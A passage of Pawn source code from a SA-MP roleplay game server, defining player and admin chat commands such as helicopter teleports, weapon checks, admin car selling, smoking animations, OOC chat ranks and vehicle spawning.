        else if(PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10)//TAXI heli up one
        {
            if (PlayerToPoint(5, playerid, 960.297363,1784.037841,8.851562))
            {
                SetPlayerPosEx(playerid, 945.962463,1790.548828,15.794094);
                SetPlayerInterior(playerid, 0);
                return 1;
            }
            else {return 1;}
        }
        else if(PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15)// Storm Heli Up
        {
            if (PlayerToPoint(5, playerid, 2793.181152,-1080.431518,30.718750))
            {
                SetPlayerPosEx(playerid, 2790.662597,-1088.139526,94.187072);
                SetPlayerInterior(playerid, 0);
                return 1;
            }
            else {return 1;}
        }
        if(PlayerInfo[playerid][pClan] == 1)//TT heli up
        {
            if (PlayerToPoint(5, playerid, 2218.994628,-1179.321777,25.890625))
            {
                SetPlayerPosEx(playerid, 2235.440429,-1184.549194,33.531250);
                SetPlayerInterior(playerid, 0);
                return 1;
            }
            else {return 1;}
        }
        if(PlayerInfo[playerid][pClan] == 2)//GG heli up (edit)
        {
            if (PlayerToPoint(5, playerid, 1649.305664,-1656.475585,22.515625))
            {
                SetPlayerPosEx(playerid, 1654.223388,-1643.526855,83.781250);
                SetPlayerInterior(playerid, 0);
                return 1;
            }
            else {return 1;}
        }
         else { return 1;}
 }
    if(strcmp(cmd, "/down", true) == 0)
    {
	       if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
        {
		// Edit SFPD //
            if (PlayerToPoint(5, playerid, -1639.474853,716.886535,48.937500)) // SFPD Heli Down
            {
                SetPlayerPosEx(playerid, -1606.268066,672.061706,-4.906250);
                SetPlayerInterior(playerid, 0);
                return 1;
            }
            else {return 1;}
        }
        if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)
        {
            if (PlayerToPoint(5, playerid, 1607.4210,1787.6932,30.4688)) //Medic heli down
            {
                SetPlayerPosEx(playerid, 1615.0603,1815.7771,10.8203);
                SetPlayerInterior(playerid, 0);
                return 1;
            }
            else {return 1;}
        }
         if(PlayerInfo[playerid][pClan] == 1)
        {
            if (PlayerToPoint(5, playerid, 2235.440429,-1184.549194,33.531250)) //TT Heli Down
            {
                SetPlayerPosEx(playerid, 2218.994628,-1179.321777,25.890625);
                SetPlayerInterior(playerid, 0);
                return 1;
            }
            else {return 1;}
        }
        if(PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15)
        {
            if (PlayerToPoint(5, playerid, 2790.662597,-1088.139526,94.187072)) // Storm Heli Down
            {
                SetPlayerPosEx(playerid, 2793.181152,-1080.431518,30.718750);
                SetPlayerInterior(playerid, 0);
                return 1;
            }
            else {return 1;}
        }

	         if(PlayerInfo[playerid][pClan] == 2)
        {
            if (PlayerToPoint(5, playerid, 1654.223388,-1643.526855,83.781250)) //GG Heli Down (Edit)
            {
                SetPlayerPosEx(playerid, 1649.305664,-1656.475585,22.515625);
                SetPlayerInterior(playerid, 0);
                return 1;
            }
            else {return 1;}
        }

        else if(PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10)
        {
           if (PlayerToPoint(5, playerid, 945.962463,1790.548828,15.794094))
            {
                SetPlayerPosEx(playerid, 960.297363,1784.037841,8.851562);
                SetPlayerInterior(playerid, 0);
                return 1;
            }
            else {return 1;}
        }
       else { return 1; }
    }





    if(strcmp(cmd, "/checkweapons", true) == 0)
    {
        if (PlayerInfo[playerid][pAdmin] <= 1)
        {
            SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
            return 1;
        }
        tmp = strtok(cmdtext,idx);
        if (!strlen(tmp))
        {
            SendClientMessage(playerid, COL_SYN, "Syntax: /checkweapons <PlayerID/PartOfName>");
            return 1;
        }
        giveplayerid = ReturnUser(tmp);
        if (giveplayerid == INVALID_PLAYER_ID)
        {
            SendClientMessage(playerid, COLOR_GREY, "That player is offline");
            return 1;
        }
        new sweapon, sammo;
        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
        format(string, sizeof(string), "%s has the following weapons:", giveplayer);
        SendClientMessage(playerid, COLOR_LIGHTRED, string);
        for (new i=0; i<13; i++)
        {
        GetPlayerWeaponData(giveplayerid, i, sweapon, sammo);
            if(sweapon != 0)
            {
                new mywep[256];
                GetWeaponName(sweapon,mywep,sizeof(mywep));
                format(string, sizeof(string), "Slotid: %d Name: %s Ammo: %d", i, mywep, sammo);
                SendClientMessage(playerid, COLOR_ROUZ, string);
            }
        }
        return 1;
    }
//////////////////////////////////////////////////////////////////////////////////////////
    if(!strcmp(cmd, "/vehid", true))
    {
        if(IsPlayerConnected(playerid))
        {
        if (PlayerInfo[playerid][pAdmin] <= 0)
        {
            SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
            return 1;
        }
            if(IsPlayerInAnyVehicle(playerid))
            {
                format(string, sizeof(string), "Vehicle ID: %d Vehicle ModelID: %d", GetPlayerVehicleID(playerid),GetVehicleModel(GetPlayerVehicleID(playerid)));
                SendClientMessage(playerid, COLOR_GREY, string);
                return 1;
            }
        }
    return 1;
    }
//=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=asellcar=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

    if(!strcmp(cmd, "/asellcar", true))
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 5)
            {
                if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COL_SYN,"You are not in a personal car");
                if(OwnedMashin[GetPlayerVehicleID(playerid)] != 0)
                {
                    new vehid = GetPlayerVehicleID(playerid);
                    GetPlayerName(playerid, playername, sizeof(playername));
                    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                    GameTextForPlayer(playerid, "~w~You have admin sold the vehicle", 10000, 3);
                    PlayerInfo[MashinOwner[vehid]][pCar] = 0;
                    SaveKonVal(MashinOwner[vehid], "pCar", 0);
                    PlayerInfo[MashinOwner[vehid]][cLocationx] = 0.0;
                    SaveKonFloat(MashinOwner[vehid], "cLocationx", 0);
                    PlayerInfo[MashinOwner[vehid]][cLocationy] = 0.0;
                    SaveKonFloat(MashinOwner[vehid], "cLocationy", 0);
                    PlayerInfo[MashinOwner[vehid]][cLocationz] = 0.0;
                    SaveKonFloat(MashinOwner[vehid], "cLocationz", 0);
                    PlayerInfo[MashinOwner[vehid]][cAngle] = 0.0;
                    SaveKonFloat(MashinOwner[vehid], "cAngle", 0);
                    PlayerInfo[MashinOwner[vehid]][cColor1] = 9999;
                    SaveKonVal(MashinOwner[vehid], "cColor1", 9999);
                    PlayerInfo[MashinOwner[vehid]][cColor2] = 9999;
                    SaveKonVal(MashinOwner[vehid], "cColor2", 9999);
                    PlayerInfo[MashinOwner[vehid]][cModel] = 0;
                    SaveKonVal(MashinOwner[vehid], "cModel", 0);
                    PlayerInfo[MashinOwner[vehid]][cPrice] = 0;
                    SaveKonVal(MashinOwner[vehid], "cPrice", 0);
                    strmid(PlayerInfo[MashinOwner[vehid]][cPlate], "NewVeh", 0, strlen("NewVeh"), 255);
                    SaveKonStr(MashinOwner[vehid], "cPlate", PlayerInfo[MashinOwner[vehid]][cPlate]);
                    PlayerInfo[MashinOwner[vehid]][cLock] = 0;
                    SaveKonVal(MashinOwner[vehid], "cLock", 0);
                    PlayerInfo[MashinOwner[vehid]][cDestroyed] = 0;
                    SaveKonVal(MashinOwner[vehid], "cDestroyed", 0);
                    PlayerInfo[MashinOwner[vehid]][cFixed] = 0;
                    SaveKonVal(MashinOwner[vehid], "cFixed", 0);
                    PINFO[MashinOwner[vehid]][cInsurance] = 0;
                    SaveKonVal(MashinOwner[vehid], "cInsurance", 0);
                    PlayerInfo[MashinOwner[vehid]][cFuel] = 0;
                    SaveKonVal(MashinOwner[vehid], "cFuel", 0);
                    PlayerInfo[MashinOwner[vehid]][cHealth] = 0.0;
                    SaveKonFloat(MashinOwner[vehid], "cHealth", 0);
                    PINFO[MashinOwner[vehid]][gLocationX] = 0;
                    SaveKonFloat(MashinOwner[vehid], "gLocationX", 0);
                    PINFO[MashinOwner[vehid]][gLocationY] = 0;
                    SaveKonFloat(MashinOwner[vehid], "gLocationY", 0);
                    PINFO[MashinOwner[vehid]][gLocationZ] = 0;
                    SaveKonFloat(MashinOwner[vehid], "gLocationZ", 0);
                    PINFO[MashinOwner[vehid]][gAngle] = 0;
                    SaveKonFloat(MashinOwner[vehid], "gAngle", 0);
                    PINFO[MashinOwner[vehid]][gParked] = 0;
                    SaveKonVal(MashinOwner[vehid], "gParked", 0);
                    SendClientMessage(MashinOwner[vehid],COLOR_ALI,"WARNING : Another admin sell your car, speak him with /report.");
                    MashinOwner[vehid] = 9999;
                    GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
                    SetVehicleParamsEx(vehid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
                    EngineSTATE[vehid] = 0;
                    LightsSTATE[vehid] = 0;
                    bonnetSTATE[vehid] = 0;
                    bootSTATE[vehid] = 0;
                    DestroyVehicle(vehid, true);
                    OwnedMashin[vehid] = 0;
                    format(string, sizeof(string), "[Admin-Warn]: admin {FFFFFF}%s using the command /asellcar to sell personal car id : %d.",playername,vehid);
                    ABroadCast(COLOR_Good,string, 5);
                    return 1;
                }
                else if(OwnedMashin_2[GetPlayerVehicleID(playerid)] != 0)
                {
                    new vehid = GetPlayerVehicleID(playerid);
                    GetPlayerName(playerid, playername, sizeof(playername));
                    PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                    GameTextForPlayer(playerid, "~w~You have admin sold the vehicle", 10000, 3);
                    PlayerInfo[MashinOwner_2[vehid]][pCar_2] = 0;
                    SaveKonVal(MashinOwner_2[vehid], "pCar_2", 0);
                    PlayerInfo[MashinOwner_2[vehid]][cLocationx_2] = 0.0;
                    SaveKonFloat(MashinOwner_2[vehid], "cLocationx_2", 0);
                    PlayerInfo[MashinOwner_2[vehid]][cLocationy_2] = 0.0;
                    SaveKonFloat(MashinOwner_2[vehid], "cLocationy_2", 0);
                    PlayerInfo[MashinOwner_2[vehid]][cLocationz_2] = 0.0;
                    SaveKonFloat(MashinOwner_2[vehid], "cLocationz_2", 0);
                    PlayerInfo[MashinOwner_2[vehid]][cAngle_2] = 0.0;
                    SaveKonFloat(MashinOwner_2[vehid], "cAngle_2", 0);
                    PlayerInfo[MashinOwner_2[vehid]][cColor1_2] = 9999;
                    SaveKonVal(MashinOwner_2[vehid], "cColor1_2", 9999);
                    PlayerInfo[MashinOwner_2[vehid]][cColor2_2] = 9999;
                    SaveKonVal(MashinOwner_2[vehid], "cColor2_2", 9999);
                    PlayerInfo[MashinOwner_2[vehid]][cModel_2] = 0;
                    SaveKonVal(MashinOwner_2[vehid], "cModel_2", 0);
                    PlayerInfo[MashinOwner_2[vehid]][cPrice_2] = 0;
                    SaveKonVal(MashinOwner_2[vehid], "cPrice_2", 0);
                    strmid(PlayerInfo[MashinOwner_2[vehid]][cPlate_2], "NewVeh", 0, strlen("NewVeh"), 255);
                    SaveKonStr(MashinOwner_2[vehid], "cPlate_2", PINFO[MashinOwner_2[vehid]][cPlate_2]);
                    PlayerInfo[MashinOwner_2[vehid]][cLock_2] = 0;
                    SaveKonVal(MashinOwner_2[vehid], "cLock_2", 0);
                    PlayerInfo[MashinOwner_2[vehid]][cDestroyed_2] = 0;
                    SaveKonVal(MashinOwner_2[vehid], "cDestroyed_2", 0);
                    PlayerInfo[MashinOwner_2[vehid]][cFixed_2] = 0;
                    SaveKonVal(MashinOwner_2[vehid], "cFixed_2", 0);
                    PINFO[MashinOwner_2[vehid]][gLocationX_2] = 0;
                    SaveKonFloat(MashinOwner_2[vehid], "gLocationX_2", 0);
                    PINFO[MashinOwner_2[vehid]][gLocationY_2] = 0;
                    SaveKonFloat(MashinOwner_2[vehid], "gLocationY_2", 0);
                    PINFO[MashinOwner_2[vehid]][gLocationZ_2] = 0;
                    SaveKonFloat(MashinOwner_2[vehid], "gLocationZ_2", 0);
                    PINFO[MashinOwner_2[vehid]][gAngle_2] = 0;
                    SaveKonFloat(MashinOwner_2[vehid], "gAngle_2", 0);
                    PINFO[MashinOwner_2[vehid]][gParked_2] = 0;
                    SaveKonVal(MashinOwner_2[vehid], "gParked_2", 0);
                    PINFO[MashinOwner_2[vehid]][cInsurance_2] = 0;
                    SaveKonVal(MashinOwner_2[vehid], "cInsurance_2", 0);
                    PlayerInfo[MashinOwner_2[vehid]][cFuel_2] = 0;
                    SaveKonVal(MashinOwner_2[vehid], "cFuel_2", 0);
                    PlayerInfo[MashinOwner_2[vehid]][cHealth_2] = 0.0;
                    SaveKonFloat(MashinOwner_2[vehid], "cHealth_2", 0);
                    SendClientMessage(MashinOwner_2[vehid],COLOR_ALI,"WARNING : Another admin sell your car, speak him with /report.");
                    MashinOwner_2[vehid] = 9999;
                    GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
                    SetVehicleParamsEx(vehid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
                    EngineSTATE[vehid] = 0;
                    LightsSTATE[vehid] = 0;
                    bonnetSTATE[vehid] = 0;
                    bootSTATE[vehid] = 0;
                    DestroyVehicle(vehid, true);
                    OwnedMashin_2[vehid] = 0;
                    format(string, sizeof(string), "[Admin-Warn]: admin {FFFFFF}%s using the command /asellcar to sell personal car id : %d.",playername,vehid);
                    ABroadCast(COLOR_Good,string, 5);
                    return 1;
                }
                else return SCM(playerid,COL_SYN,"That vehicle isn't a ownable car.");
            }
            else
            {
                SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/smoke", true) == 0)
    {
    if(PlayerHandsCuffed[playerid] == 1)
    {
    SCM(playerid,COLOR_LIGHTRED,"You can't smoking when your hands are cuffed.");
    return 1;
    }
        if(IsPlayerConnected(playerid))
        {
            if(gPlayerLogged[playerid] == 0)
            {
                SendClientMessage(playerid, COLOR_GREY, "You need to login first.");
                return 1;
            }
                if(PlayerInfo[playerid][pLighter] == 0)
                {
                    SendClientMessage(playerid, COLOR_Good, "You haven't a lighter to light up your cigarette.");
                    return 1;
                }
                if(PlayerInfo[playerid][pCigarettes] == 0)
                {
                    SendClientMessage(playerid, COLOR_Good, "You haven't a cigarette to smoke.");
                    return 1;
                }
                if(IsSmoking[playerid] == 1)
                {
                  SCM(playerid,COLOR_Good,"you are already smoking,use /dropcig first");
                  return 1;
                }
                    PlayerInfo[playerid][pLighter] -= 1;
                    SaveKonVal(playerid, "pLighter", PINFO[playerid][pLighter]);
                    PlayerInfo[playerid][pCigarettes] -= 1;
                    SaveKonVal(playerid, "pCigarettes", PINFO[playerid][pCigarettes]);
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    IsSmoking[playerid] = 60;
                    format(string, sizeof(string), "%s takes out his/her cigarette and lighter from his/her pocket and light his/her cigarette.", sendername);
                    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                    SendClientMessage(playerid, COLOR_visit, "TIP: You can /dropcig anytime you want.");
                    UsingSmokeAnim[playerid] = 1;
                    LoopingAnim(playerid,"SMOKING","M_smk_in",3.0,0,0,0,0,4500);
                    SetPlayerSpecialAction(playerid,SPECIAL_ACTION_SMOKE_CIGGY);
                    SCM(playerid,COLOR_visit, "Now press left Click on Mouse to smoking");
                    SCM(playerid,COLOR_visit, "Or use a smoke anim(/smoking)");
                    IsSmoking[playerid] = 1;
                    return 1;
        }
        return 1;
    }
    if(!strcmp(cmd, "/dropcig", true))
    {
    if(PlayerHandsCuffed[playerid] == 1)
    {
    SCM(playerid,COLOR_LIGHTRED,"You can't drop cigarette When Your hands are cuffed.");
    return 1;
    }
        if(IsPlayerConnected(playerid))
        {
            if(IsSmoking[playerid] == 1)
            {
                IsSmoking[playerid] = 0;
                if(UsingSmokeAnim[playerid] == 1)
                {
                 SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
                 UsingSmokeAnim[playerid] = 0;
                 SCM(playerid,COLOR_LIGHTRED, "You Droped your cigarette.");
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "You are not even smoking.");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/saveaccounts", true) == 0)
    {
        if (PlayerInfo[playerid][pAdmin] >= 7)
        {
            GameTextForPlayer(playerid, "~w~All accounts in server saved.", 2000, 3);
            SaveAccounts();
        }
        else
        {
            SendClientMessage(playerid, COLOR_GREEN, "Error: You are not authorized to use this command.");
        }
        return 1;
    }

/*	if(strcmp(cmd, "/oc", true) == 0 || strcmp(cmd, "/o", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(gPlayerLogged[playerid] == 0)
	        {
	            SendClientMessage(playerid, COLOR_RED, "Not loggened in!");
	            return 1;
	        }
			if (PlayerInfo[playerid][pAdmin] <= 1)
			{
				SendClientMessage(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command");
				return 1;
			}
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new result[145];
			result = strtokEx(cmdtext, idx);
			if(!strlen(result))
			{
				SendClientMessage(playerid, COL_SYN, "Syntax: (/o)oc <Text>");
				return 1;
			}
			if(PlayerInfo[playerid][pAdmin]== 1){format(string, sizeof(string), "{D0000F}(( {ffffff}%s: {D0000F}%s {D0000F}))" , sendername, result);}
			else if(PlayerInfo[playerid][pAdmin]== 1){format(string, sizeof(string), "{D0000F}(( {ffffff}%s: {D0000F}%s {D0000F}))" , sendername, result);}
			else if(PlayerInfo[playerid][pAdmin]== 1){format(string, sizeof(string), "{D0000F}(( {ffffff}%s: {D0000F}%s {D0000F}))" , sendername, result);}
            else {format(string, sizeof(string), "{D0000F}(( {D50210}%s: {D0000F}%s {D0000F}))" , sendername, result);}
            OOCOff(COLOR_RED,string);
            printf("%s", string);
		}
		return 1;
	}

*/
//----------------------------------[ooc]-----------------------------------------------
	if(strcmp(cmd, "/oocadmin", true) == 0 || strcmp(cmd, "/oa", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(gPlayerLogged[playerid] == 0)
	        {
	            SendClientMessage(playerid, COLOR_RED, "Not loggened in!");
	            return 1;
	        }
			if (PlayerInfo[playerid][pAdmin] < 1)
			{
				SendClientMessage(playerid, COLOR_YELLOW2, "Error: You are not admin.");
				return 1;
			}
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new result[145];
			result = strtokEx(cmdtext, idx);
			if(!strlen(result))
			{
				SendClientMessage(playerid, COL_SYN, "Syntax: (/oa)oc <Text>");
				return 1;
			}
			new arank[64];
			if(PlayerInfo[playerid][pAdmin] == 1) { arank = "AdminLvL(1)"; }
			else if(PlayerInfo[playerid][pAdmin] == 2) { arank = "AdminLvL(2)"; }
			else if(PlayerInfo[playerid][pAdmin] == 3) { arank = "AdminLvL(3)"; }
			else if(PlayerInfo[playerid][pAdmin] == 4) { arank = "AdminLvL(4)"; }
			else if(PlayerInfo[playerid][pAdmin] == 5) { arank = "AdminLvL(5)"; }
   			else if(PlayerInfo[playerid][pAdmin] == 6) { arank = "Administration Team"; }
            else if(PlayerInfo[playerid][pAdmin] == 7) { arank = "Supervisor"; } //sssss
            else if(PlayerInfo[playerid][pAdmin] == 8) { arank = " Hoster"; }
            else if(PlayerInfo[playerid][pAdmin] == 9) { arank = " Manager"; }
            else if(PlayerInfo[playerid][pAdmin] == 10) { arank = " Scripter"; }
            else if(PlayerInfo[playerid][pAdmin] == 1000000) { arank = " Founder"; }
			if(PlayerInfo[playerid][pAdmin]<= 1){format(string, sizeof(string), "(( %s: %s ))" , arank, sendername, result);}
			else {format(string, sizeof(string), "{57e547}(( %s %s: %s ))" , arank, sendername, result);}
			OOCOff(COLOR_RED,string);
			printf("%s", string);
		}
		return 1;
	}
	if(strcmp(cmd, "/ooc", true) == 0 || strcmp(cmd, "/o", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(gPlayerLogged[playerid] == 0)
	        {
	            SendClientMessage(playerid, COLOR_RED, "Not loggened in!");
	            return 1;
	        }
			if (PlayerInfo[playerid][pAdmin] <= 1)
			{
				SendClientMessage(playerid, COLOR_YELLOW2, "Error: You are not Owner.");
				return 1;
			}
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new result[145];
			result = strtokEx(cmdtext, idx);
			if(!strlen(result))
			{
				SendClientMessage(playerid, COL_SYN, "Syntax: (/o)oc <Text>");
				return 1;
			}
			new arank[64];
   			if(PlayerInfo[playerid][pAdmin] == 6) { arank = "Administration Team"; }
            else if(PlayerInfo[playerid][pAdmin] == 7) { arank = "Supervisor"; } //sssss
            else if(PlayerInfo[playerid][pAdmin] == 8) { arank = " Hoster"; }
            else if(PlayerInfo[playerid][pAdmin] == 9) { arank = "HosterLvl2"; }
            else if(PlayerInfo[playerid][pAdmin] == 10) { arank = "HosterLvl3"; }
            else if(PlayerInfo[playerid][pAdmin] == 11) { arank = " Manager"; }
            //else if(PlayerInfo[playerid][pAdmin] == 10) { arank = " Scripter"; }
            else if(PlayerInfo[playerid][pAdmin] == 1000000) { arank = " Founder"; }
			if(PlayerInfo[playerid][pAdmin]<= 6){format(string, sizeof(string), "(({E04343}<< {D50210}%s %s: {FFFFFF}%s {E04343}>>))" , arank, sendername, result);}
			else {format(string, sizeof(string), "{57e547}(( {D50210}%s %s: {FFFFFF}%s {57e547}))", arank, sendername, result);}
			OOCOff(COLOR_GG,string);
			printf("%s", string);
		}
		return 1;
	}
//=================================================================================================

// Ts All
	if(strcmp(cmd, "/ts", true) == 0)
    {
                SendClientMessage(playerid, COLOR_YELLOW2, "Team Speak IP : 185.105.239.193");
        return 1;
    }
    if(strcmp(cmd, "/tsa", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				if(gPlayerLogged[playerid] == 0)
				{
					SendMessage(playerid, COLOR_RED, "Not loggened in!");
					return 1;
				}
				if (PlayerInfo[playerid][pAdmin] <= 7)
				{
					SendMessage(playerid, COLOR_YELLOW2, "Error: You are not admin.");
					return 1;
				}
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new result[145];
				result = strtokEx(cmdtext, idx);

				format(string, sizeof(string), "{fb1111}Team Speak IP : {ffffff}185.105.239.193{fb1111}" , sendername, result);
				OOCOff(COLOR_LIGHTRED,string);
				printf("%s", string);
			}
			return 1;
		}
		if(strcmp(cmd, "/Channel", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				if(gPlayerLogged[playerid] == 0)
				{
					SendMessage(playerid, COLOR_RED, "Not loggened in!");
					return 1;
				}
				if (PlayerInfo[playerid][pAdmin] <= 7)
				{
					SendMessage(playerid, COLOR_YELLOW2, "Error: You are not admin.");
					return 1;
				}
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new result[145];
				result = strtokEx(cmdtext, idx);

				format(string, sizeof(string), "{fb1111}Telegram Id : {ffffff}@IRan_Samper" , sendername, result);
				OOCOff(COLOR_LIGHTRED,string);
				printf("%s", string);
			}
			return 1;
		}
		if(strcmp(cmd, "/foa", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				if(gPlayerLogged[playerid] == 0)
				{
					SendMessage(playerid, COLOR_RED, "Not loggened in!");
					return 1;
				}
				if (PlayerInfo[playerid][pAdmin] <= 7)
				{
					SendMessage(playerid, COLOR_YELLOW2, "Error: You are not admin.");
					return 1;
				}
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new result[145];
				result = strtokEx(cmdtext, idx);

				format(string, sizeof(string), "{fb1111}Coming Soon" , sendername, result);
				OOCOff(COLOR_LIGHTRED,string);
				printf("%s", string);
			}
			return 1;
		}


	if(strcmp(cmd, "/Vfixveh", true) == 0 || strcmp(cmd, "/Vfix", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
        if(PlayerInfo[playerid][pPremiumAccount] < 100) return SCM(playerid, COLOR_GREEN, "Vip nistid.");
            if(IsPlayerInAnyVehicle(playerid))
            {
                RepairVehicleEx(GetPlayerVehicleID(playerid));
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "Vehicle Fixed.");
           		new strs[500];
				GetPlayerName(playerid, giveplayer, sizeof(giveplayer));
				format(strs,500,"{00FFFF}Vip %s[%i] Mashin khod ra fix kard.",giveplayer,playerid);
				AdminWarn(strs);
            }
        }
        return 1;
    }
if(strcmp(cmd, "/vehe", true) == 0)
		{
			if (PlayerInfo[playerid][pAdmin] <= 2) return SendMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
			if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_GG,"You cannot create a vehicle when you are in a vehicle.");
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp)) {
			SendMessage(playerid, COL_SYN, "Syntax: /vehe <ModelName/ID> <ColorID1> <ColorID2> <Point> <Count>");
			SCM(playerid,COLOR_GG,"Stand toward West or East.");
			return 1;
			}

			new car;
			if(IsNumeric(tmp))
			{
				car = strval(tmp);
				if(car < 400 || car > 611) return SendMessage(playerid, COLOR_GG, "Vehicle Number can't be below 400 or above 611");
			}
			else
			{
				for(new i = 0;i<212;i++)
				{
					if(strfind(aVehicleNames[i], tmp, true) != -1)
					{
						car = i+400;
					}
				}
			}
			if(car == 0) return SCM(playerid, COLOR_AMIR, "Invalid vehicle name.");
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp)) return SendMessage(playerid, COL_SYN, "Syntax: /vehe <ModelName/ID> <ColorID1> <ColorID2> <Point> <Count>");
			new color1;
			color1 = strval(tmp);
			if(color1 < 0 || color1 > 255) return SendMessage(playerid, COLOR_GG, "Color Number can't be below 0 or above 255");
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp)) return SendMessage(playerid, COL_SYN, "Syntax: /vehe <ModelName/ID> <ColorID1> <ColorID2> <Point> <Count>");
			new color2;
			color2 = strval(tmp);
			if(color2 < 0 || color2 > 255) return SendMessage(playerid, COLOR_GG, "Color Number can't be below 0 or above 255");

			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp)) return SendMessage(playerid, COL_SYN, "Syntax: /vehe <ModelName/ID> <ColorID1> <ColorID2> <Point> <Count>");
			new dis;
			dis = strval(tmp);
			if(dis < 2) return SendMessage(playerid, COLOR_GG, "Distance point can't be below 2");

			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp)) return SendMessage(playerid, COL_SYN, "Syntax: /vehe <ModelName/ID> <ColorID1> <ColorID2> <Point> <Count>");
			new count;
			count = strval(tmp);
			new c = count%2;
			if(c != 0 || count == 0) return SendMessage(playerid, COLOR_GG, "Count must be an even.");


			new Float:X,Float:Y,Float:Z,Float:angle;
			GetPlayerFacingAngle(playerid,angle);
			GetPlayerPos(playerid, X,Y,Z);
			new carid,disx,carid2;
			for(new i=1;i<(count/2)+1;i++) {
			disx = i*dis;

			carid = CreateVehicle(car, X,Y+disx,Z+1, angle, color1, color2, -1);
			carid2 = CreateVehicle(car, X,Y-disx,Z+1, angle, color1, color2, -1);

			SetVehicleNumberPlate(carid, "{F90000}Joker");
			SetVehicleNumberPlate(carid2, "{F90000}Joker");


			CreatedCars[CreatedCar] = carid;
			CreatedCar ++;


			CreatedCars[CreatedCar] = carid2;
			CreatedCar ++;


			IsValidAVeh[carid2] = true;
			IsValidAVeh[carid] = true;

			VehOwned[carid] = 2;
			VehOwner[carid] = playerid;
			VehOwned[carid2] = 2;
			VehOwner[carid2] = playerid;

			LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
			SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid));

			LinkVehicleToInterior(carid2, GetPlayerInterior(playerid));
			SetVehicleVirtualWorld(carid2, GetPlayerVirtualWorld(playerid));

			}

			return 1;
		}
   	//---------------------------------------------------------------------------------------
		if(strcmp(cmd,"/adh",true)==0) {
			if(IsPlayerConnected(playerid)) {
				if (PlayerInfo[playerid][pAdmin] >= 1) {
					new x_nr[256];
					x_nr = strtok(cmdtext, idx);
					if(!strlen(x_nr)) {
						SCM(playerid, CRISTIAN, "___________________________________________");
						SCM(playerid, COLOR_WHITE, "USPGE: /adh [number]");
						SCM(playerid, COLOR_GRAD2, "Available numbers: 1 = (Admin Level 1), 2 = (Admin Level 2), 3 = (Admin Level 3)");
						SCM(playerid, COLOR_GRAD2, "Available numbers: 4 = (Admin Level 4), 5 = (Admin Level 5), 6 = (Admin Level 6)");
						SCM(playerid, COLOR_GRAD2, "Available numbers: 7 = (Admin Level 7)");
						return 1; }
					if(strcmp(x_nr,"1",true) == 0) {
						if (PlayerInfo[playerid][pAdmin] >= 1) {
							SCM(playerid, CRISTIAN,"_______________________________________");
							SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
							SCM(playerid, COLOR_GRAD2, "*** Admin Level 1  ***  /specoff /cc /ar /cr /reports /al /ae /specplayer /fly /drag /quitwarn /banid /checkskill /banvps /stopevent /gototemple");
							SCM(playerid, COLOR_GRAD2, "*** Admin Level 1  ***  /vehid /check /ajail /setint /setvw /setmypos /stt /goto /gotolist /multiwarn /asuspend /stoppb /gotogs /gotojail");
							SCM(playerid, COLOR_GRAD2, "*** Admin Level 1  ***  /slap /mute /kk /warn /ban /unfreeze /respawn /agr /sban /skick /dfind /joinwarn /freeze /gotocnn /gotokelisa /Goto1 Ta 15");}  }
					else if(strcmp(x_nr,"2",true) == 0) {
						if (PlayerInfo[playerid][pAdmin] >= 2) {
							SCM(playerid, CRISTIAN,"_______________________________________");
